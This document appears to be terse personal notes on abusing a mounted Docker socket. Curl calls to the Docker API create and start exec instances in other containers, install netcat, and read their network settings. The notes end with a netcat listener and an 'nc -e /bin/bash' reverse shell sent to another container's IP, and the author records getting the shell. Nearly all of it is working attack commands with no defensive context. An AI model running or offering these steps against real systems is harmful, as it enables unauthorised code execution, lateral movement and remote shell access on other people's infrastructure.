

Running docker container with docker.sock mounted:

sudo docker run -it -d -p 22:22 -v /var/run/docker.sock:/var/run/docker.sock ubuntu:new

List running docker containers with docker.sock and curl

curl -s --unix-socket /var/run/docker.sock -X GET http://localhost/containers/json | jq

List docker images with docker.sock and curl

curl -s --unix-socket /var/run/docker.sock -X GET http://localhost/images/json | jq




==Create Exec instance from running container:

curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/containers/5adafc1242a9bbb160c2a81d9b7408999c4be545db73b9da0b1ddffbedee5d4e/exec -H "Content-Type: application/json" -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "DetachKeys": "ctrl-p,ctrl-q", "Tty": false, "Cmd": ["date"] }'


==Copy the instance id:



==Run the exec instance:

curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/exec/ebf55a4f73932ea9fac77e5ed7829c1e6757dafbef7ffcc247c2f51c6c9778e9/start -H "Content-Type: application/json" -d '{ "Detach": false, "Tty": false }'


------

==Installing netcat:

curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/containers/6c314a55eb4b1d8a340cb677717d536f0e0c9c38a280520b373142f9c4be32a4/exec -H "Content-Type: application/json" -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "DetachKeys": "ctrl-p,ctrl-q", "Tty": false, "Cmd": ["apt","install","-y","netcat"] }'

f24da60ac564085c4a331e65a57fb09a5c7fff8fde0bae2962780f263b57e7a3

curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/exec/29b4aab392a25018c77dfdad5afe5529f22c50fd30140fe3fddc0f4f7f948004/start -H "Content-Type: application/json" -d '{ "Detach": false, "Tty": false }'

==Check nc

curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/containers/43de4ed6fa5df1e1f06432df00f6070fb8b6213992b84a7ae2646130263cbd4b/exec -H "Content-Type: application/json" -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "DetachKeys": "ctrl-p,ctrl-q", "Tty": false, "Cmd": ["which","nc"] }'

14b6a08a29fca55a35166f67b48e67cb56387722a67794b397936acc37a31c7a

curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/exec/187d793157aba0a01c1fac853a948d7cf11ff4aa13647236265b26707229f2fb/start -H "Content-Type: application/json" -d '{ "Detach": false, "Tty": false }'


==Install nettools

curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/containers/43de4ed6fa5df1e1f06432df00f6070fb8b6213992b84a7ae2646130263cbd4b/exec -H "Content-Type: application/json" -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "DetachKeys": "ctrl-p,ctrl-q", "Tty": false, "Cmd": ["apt","install","-y","net-tools"] }'



curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/exec/55cd4e8cd11c8d1816a05f1bb9c5f488e1ef1f399a0a1ab226d12b86dd03c604/start -H "Content-Type: application/json" -d '{ "Detach": false, "Tty": false }'

==Check IP address


curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/containers/43de4ed6fa5df1e1f06432df00f6070fb8b6213992b84a7ae2646130263cbd4b/exec -H "Content-Type: application/json" -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "DetachKeys": "ctrl-p,ctrl-q", "Tty": false, "Cmd": ["ifconfig"] }'


curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/exec/63272fa7c7d7a490c81b5f82c103a97ff0f70db9bbe208a7253b629ff649fb34/start -H "Content-Type: application/json" -d '{ "Detach": false, "Tty": false }'


===


Open nc reverse shell:


nc -lvp 8080


Send reverse shell:


nc -e /bin/sh 172.17.0.3 8080

curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/containers/6c314a55eb4b1d8a340cb677717d536f0e0c9c38a280520b373142f9c4be32a4/exec -H "Content-Type: application/json" -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "DetachKeys": "ctrl-p,ctrl-q", "Tty": false, "Cmd": ["nc","-e","/bin/bash","172.17.0.3", "8080"] }' 



curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/exec/6590f5ce96f0b3e9a65870034cab3eaac5c08a4b03de306abcea637a54f4751d/start -H "Content-Type: application/json" -d '{ "Detach": false, "Tty": false }'



Got reverse shell.
===




